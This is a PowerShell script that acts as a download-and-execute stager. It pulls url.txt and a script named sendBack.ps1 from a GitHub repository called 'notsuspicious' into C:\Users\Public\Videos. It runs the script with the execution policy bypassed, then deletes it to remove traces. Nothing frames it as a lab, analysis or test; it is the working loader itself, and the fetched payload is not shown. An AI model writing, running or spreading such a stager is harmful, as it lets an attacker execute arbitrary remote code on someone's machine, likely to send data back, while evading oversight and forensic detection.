try {
    # Download url.txt
    Invoke-WebRequest 'https://github.com/RaupenInspektor/notsuspicious/raw/main/url.txt' -OutFile 'C:\Users\Public\Videos\GraphicalUserInterface\url.txt'
    
    # Download and execute sendBack.ps1
    $ps1Content = Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/notsuspicious/raw/main/sendBack.ps1" -UseBasicParsing | Select-Object -ExpandProperty Content
    $ps1FilePath = "C:\Users\Public\Videos\sendBack.ps1"
    $ps1Content | Set-Content -Path $ps1FilePath -Encoding UTF8
    
    # Execute the PowerShell script
    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File $ps1FilePath" -NoNewWindow -Wait
}
catch {
    # Handle exceptions here
    Write-Host "An error occurred: $_"
}
finally {
    # Delete the ps1 file after execution
    Remove-Item -Path $ps1FilePath -Force
}
